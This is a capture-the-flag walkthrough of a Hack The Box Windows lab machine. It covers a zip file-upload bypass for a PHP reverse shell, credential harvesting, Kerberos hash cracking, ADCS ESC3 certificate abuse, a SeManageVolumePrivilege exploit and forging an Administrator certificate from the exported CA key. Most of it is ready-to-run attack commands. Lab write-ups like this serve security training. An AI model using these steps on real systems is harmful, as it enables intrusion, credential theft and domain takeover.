## Initial Reconnaissance & Web Application Exploitation

The initial phase involves network scanning, web enumeration, and a sophisticated file upload vulnerability bypass.

### Nmap Scan & Host File Update

1.  **Nmap Scan:**

    ```bash
    nmap -sC -sV -vv -oA certificate 10.10.11.71
    ```

      * `-sC`: Performs a script scan using default scripts.
      * `-sV`: Probes open ports to determine service/version information.
      * `-vv`: Increases verbosity.
      * `-oA certificate`: Outputs results in all major formats with the base name `certificate`.
      * `10.10.11.71`: The IP address of the target machine.

    The scan reveals multiple open ports, including DNS (53), HTTP (80), Kerberos, LDAP, and SMB. It also indicates an Active Directory environment with the domain `certificate.htb` and a Domain Controller named `DC1`. Apache HTTPD is running on Windows, indicating a XAMPP-like stack. A critical observation is the presence of a **certificate-la** service, suggesting ADCS. A clock skew of 8 hours is also noted.

2.  **Update Hosts File:**

    ```bash
    sudo vi /etc/hosts
    # Add:
    10.10.11.71 certificate.htb dc1.certificate.htb dc1
    ```

### Web Application Analysis & Account Creation

The web server at `http://certificate.htb` is a PHP application.

1.  **Web Navigation:** Explore the site. It appears to be an educational platform with sections like "About," "Contact," "Courses," and "Account Registration."
2.  **Account Registration:** Create a student account.
      * **First Name:** `root`
      * **Email:** `root@ipsec.rocks`
      * **Password:** `password`
      * **Username:** `ipsec`
      * **Account Type:** `Student`
        After registration, log in with the new `ipsec` credentials.
3.  **Course Enrollment & File Upload:** Navigate to "Courses," enroll in a course, and go to the "Submit" section. The application allows uploading files (PDF, DOCX, PPTX, XLSX) and specifically mentions accepting "zip archives."

### File Upload Vulnerability Bypass (PHP Shell)

The application performs file extension checks within zip archives. The video demonstrates two methods to bypass this:

1.  **Null Byte Injection:**
    This technique exploits how some applications process filenames with null bytes (`%00`). PHP might read the full filename (including `.php%00.pdf`), but the underlying file system writes only up to the null byte, resulting in a `.php` file.

      * **Create PHP Reverse Shell:** Download a PHP reverse shell (e.g., from `pentestmonkey` or `ivan`'s GitHub Gist). Modify the IP address and port to your attacking machine (e.g., `10.10.14.8:9001`). Save it as `shell.php.pdf`.
      * **Create Zip Archive:**
        ```bash
        zip shell.zip shell.php.pdf
        ```
      * **Intercept with Burp Suite:** Upload `shell.zip` via the web interface and intercept the request in Burp Suite.
      * **Modify Filename in Hex Editor:** In the intercepted request, go to the Hex editor. Locate instances of `shell.php.pdf` within the zip file's metadata (there are usually two). Change the `.` before `pdf` to a **null byte (`00`)**. So, `shell.php.pdf` becomes `shell.php<NULL>pdf`.
      * **Forward Request:** Forward the modified request. The server should report "file uploaded successfully" and provide a link to the uploaded file.
      * **Set up Listener & Trigger Shell:** Set up a Netcat listener (`nc -lvnp 9001`) and then access the provided URL for the uploaded `shell.php` file. This should trigger a reverse shell.

2.  **Zip Concatenation (Zip Stacking):**
    This method combines two zip files: one legitimate (e.g., a PDF) and one containing the malicious payload. Different programs may read different parts of the combined zip, bypassing checks.

      * **Create Legitimate Zip:**
        ```bash
        echo "Please subscribe" > ipsec.pdf
        zip legit.zip ipsec.pdf
        ```
      * **Create Malicious Zip:** Use the `shell.php` (from the null byte method, without the `.pdf` extension).
        ```bash
        zip stacked.zip shell.php
        ```
      * **Concatenate Zips:**
        ```bash
        cat legit.zip stacked.zip > both.zip
        ```
      * **Upload `both.zip`:** Upload this `both.zip` file through the web interface.
      * **Set up Listener & Trigger Shell:** Set up your Netcat listener. When the server processes the `both.zip`, it extracts `shell.php`. Access the resulting `shell.php` URL to get a reverse shell.

## Local Enumeration & Active Directory Certificate Services (ADCS) Exploitation

Once a web shell is obtained, the focus shifts to internal enumeration and leveraging ADCS for privilege escalation.

### Database Credential Retrieval

1.  **Locate `db.php`:**
    ```bash
    dir /
    # Find C:\xampp\htdocs\db.php
    ```
2.  **Retrieve Credentials:**
    ```bash
    type C:\xampp\htdocs\db.php
    ```
    This reveals MySQL credentials: **User: `sarah.b`**, **Password: `Blink182`**.

### MySQL Database Enumeration

Access the MySQL database using the discovered credentials.

```bash
C:\xampp\mysql\bin\mysql.exe -u sarah.b -p"Blink182" -e "SHOW DATABASES;"
C:\xampp\mysql\bin\mysql.exe -u sarah.b -p"Blink182" -D certificate -e "SHOW TABLES;"
C:\xampp\mysql\bin\mysql.exe -u sarah.b -p"Blink182" -D certificate -e "SELECT username, password FROM users;"
```

This confirms the `sarah.b` password and reveals other user credentials (which in this case were not directly useful for AD).

### Initial Active Directory User Access

Use the `sarah.b` credentials to gain access to Active Directory resources.

1.  **Test Credentials with `netexec`:**

    ```bash
    netexec smb dc1.certificate.htb -u sarah.b -p 'Blink182'
    ```

    This confirms valid credentials.

2.  **Gain WinRM Access:**

    ```bash
    evil-winrm -i 10.10.11.71 -u sarah.b -p 'Blink182'
    ```

    This provides an interactive PowerShell session on the Domain Controller.

### Analyzing `WSO1.pcap` for Kerberos Hashes

Inside the `sarah.b` WinRM session, a `WSO1` directory contains `description.txt` and `wso1.pcap`. The `description.txt` indicates a problem with reports, and `wso1.pcap` is attached for analysis.

1.  **Download `wso1.pcap`:**

    ```powershell
    download wso1.pcap
    ```

2.  **Analyze `wso1.pcap` with `tshark` or `wireshark` and `kekeo`/`Rubeus`:**
    The video uses a custom Python script called `KB5_Roast_Parser.py` (found on GitHub, e.g., by `lyonkit`) to extract Kerberos AS-REP hashes from the pcap.

      * **Manual Extraction Logic:** The pcap contains an AS-REQ (Kerberos Authentication Service Request) for `lion.sk`. The response indicates "pre-authentication required," providing a salt (realm + username) and an encrypted timestamp (E-type 18, AES256-SHA1). This timestamp is encrypted with `lion.sk`'s NTLM hash, salted with the realm and username.
      * **Using `KB5_Roast_Parser.py`:**
        ```bash
        python3 KB5_Roast_Parser.py --file wso1.pcap --as-request
        ```
        This will output the Kerberos AS-REP hash for `lion.sk`.

3.  **Crack Kerberos AS-REP Hash:**
    Copy the extracted hash and use Hashcat.

    ```bash
    hashcat -m 18200 <hash> /usr/share/wordlists/rockyou.txt --force
    ```

      * `-m 18200`: Specifies the hash type for Kerberos AS-REP (Type 18).
        This reveals `lion.sk`'s password: **`2WSXcde#`**.

### ADCS Escalation with `certipy` (ESC3)

With `lion.sk`'s credentials, the process moves to exploiting ADCS.

1.  **Test `lion.sk` Credentials:**

    ```bash
    netexec smb dc1.certificate.htb -u lion.sk -p '2WSXcde#'
    evil-winrm -i 10.10.11.71 -u lion.sk -p '2WSXcde#'
    ```

    Confirm WinRM access.

2.  **Enumerate Group Memberships:**
    In the `evil-winrm` session, run `whoami /all`. This shows `lion.sk` is a member of **`Domain CRA Managers`**. This group is key for ADCS attacks.

3.  **Collect BloodHound Data (RustHound):**

    ```bash
    RustHound -d certificate.htb -u lion.sk -p '2WSXcde#' --dc 10.10.11.71
    ```

    Upload the generated JSON files to BloodHound to visualize attack paths.

4.  **Identify Vulnerable Certificate Templates (ESC3):**
    Use `certipy` to find vulnerable ADCS configurations.

    ```bash
    certipy find -u lion.sk -p '2WSXcde#' -target-dc certificate.htb -dc-ip 10.10.11.71 --vulnerable
    ```

    This command outputs a report. It highlights a vulnerability to **ESC3**, where a certificate template has the `Request Agent EKU` (Enhanced Key Usage) set, allowing the `lion.sk` user (via `Domain CRA Managers`) to register certificates on behalf of other users.

5.  **Request a "Request Agent" Certificate:**
    Obtain a certificate that grants the ability to request certificates on behalf of others.

    ```bash
    certipy req -u lion.sk -p '2WSXcde#' -ca 'certificate-DC1-CA' -template Delegated \
    -dc-ip 10.10.11.71 -output delegated.pfx
    ```

    This creates `delegated.pfx`.

6.  **Find a User with `mail` Attribute:**
    The ESC3 exploit often requires impersonating a user with an email address.

    ```powershell
    Get-ADUser -Filter * -Properties Name, SamAccountName, Mail | Select-Object Name, SamAccountName, Mail
    ```

    Look for a user with a `Mail` attribute. The video finds **`RyanK`** is a member of `Domain Storage Managers`.

7.  **Request Certificate On Behalf of `RyanK`:**
    Use the `delegated.pfx` to request a certificate for `RyanK`.

    ```bash
    certipy req -u lion.sk -p '2WSXcde#' -ca 'certificate-DC1-CA' -template SignedUser -on-behalf-of 'RyanK' \
    -pfx delegated.pfx -dc-ip 10.10.11.71 -output ryan_k.pfx
    ```

      * `-on-behalf-of 'RyanK'`: Specifies to request the certificate on behalf of `RyanK`.
      * `-template SignedUser`: A common template used for this attack.

8.  **Get `RyanK`'s NTLM Hash:**
    Use `RyanK`'s `ryan_k.pfx` certificate to get their NTLM hash.

    ```bash
    certipy auth -pfx ryan_k.pfx -dc-ip 10.10.11.71 -output-format ntlm
    ```

    This outputs `RyanK`'s NTLM hash.

### Leveraging `SeManageVolumePrivilege`

Authenticate as `RyanK` using their NTLM hash.

1.  **WinRM as `RyanK`:**

    ```bash
    evil-winrm -i 10.10.11.71 -u RyanK -H <RyanK_NTLM_hash>
    ```

2.  **Check Privileges:**

    ```powershell
    whoami /all
    ```

    This shows `RyanK` has `SeManageVolumePrivilege`, which is dangerous as it allows manipulating file system ACLs.

3.  **Exploit `SeManageVolumePrivilege`:**
    Download and execute a suitable exploit (e.g., from `HackTheBox` or `enox`'s GitHub for `SeManageVolumePrivilege`). This exploit typically sets the ACLs of sensitive directories (like `C:\Users\Administrator\Desktop`) to `Everyone:Full Control`.

      * **Download Exploit (from attacker machine, serve with Python HTTP server):**
        ```bash
        wget http://<your_ip>:8000/SeManageVolumeExploit.exe
        ```
      * **Upload to Target:**
        ```powershell
        upload SeManageVolumeExploit.exe
        ```
      * **Execute Exploit:**
        ```powershell
        .\SeManageVolumeExploit.exe
        ```
        This allows access to administrator's desktop.

### Golden Ticket Attack for Root

Even with file system access, `root.txt` might be protected by Windows EFS (Encrypted File System). A Golden Ticket attack is used to impersonate the Domain Administrator.

1.  **Export Root CA Certificate (Signing Key):**
    First, find the serial number of the Root CA certificate.

    ```bash
    certutil -store root
    ```

    Look for the "Serial Number."
    Then, export the Root CA's certificate to a PFX file.

    ```powershell
    certutil -exportPFX "<Serial_Number>" ca.pfx
    ```

    This creates `ca.pfx` on the target machine.

2.  **Download `ca.pfx`:**

    ```powershell
    download ca.pfx
    ```

3.  **Forge Administrator Certificate (Golden Ticket):**
    On your attacking machine, use `certipy` to forge a certificate for the `Administrator` using the downloaded `ca.pfx`.

    ```bash
    certipy forge -pfx ca.pfx -upn administrator@certificate.htb -subject "CN=Administrator,DC=certificate,DC=htb" \
    -dc-ip 10.10.11.71 -output admin_forged.pfx
    ```

    This generates `admin_forged.pfx`.

4.  **Get Administrator NTLM Hash:**

    ```bash
    certipy auth -pfx admin_forged.pfx -dc-ip 10.10.11.71 -output-format ntlm
    ```

    This provides the NTLM hash for the `Administrator`.

5.  **Final Root Access:**
    Use `evil-winrm` with the Administrator's NTLM hash.

    ```bash
    evil-winrm -i 10.10.11.71 -u Administrator -H <Administrator_NTLM_hash>
    ```

    You now have a root shell.

    ```powershell
    cd C:\Users\Administrator\Desktop
    type root.txt
    ```